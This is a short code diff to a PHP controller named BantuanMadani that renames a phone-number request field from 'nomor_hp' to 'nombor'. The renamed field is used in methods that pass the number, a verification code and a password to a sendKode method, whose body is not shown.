@@ -15,25 +15,25 @@ class BantuanMadani extends Controller
     {
         $request->validate([
             'nama' => 'required',
-            'nomor_hp' => 'required|string|min:10|max:14',
+            'nombor' => 'required|string|min:10|max:14',
 
         ]);
-        $this->sendKode($request->nomor_hp);
+        $this->sendKode($request->nombor);
     }
 
     public function verifikasi_store(Request $request)
     {
 
         $code = implode('', $request->code_verif);
-        $nomor_hp = $request->nomor_hp;
-        $this->sendKode($nomor_hp, $code);
+        $nombor = $request->nombor;
+        $this->sendKode($nombor, $code);
     }
     public function password_store(Request $request)
     {
 
         $code = implode('', $request->code_verif);
-        $nomor_hp = $request->nomor_hp;
-        $this->sendKode($nomor_hp, $code, $request->password);
+        $nombor = $request->nombor;
+        $this->sendKode($nombor, $code, $request->password);
     }
 
     public function sendKode($phone = "",  $otp = "", $password = "")
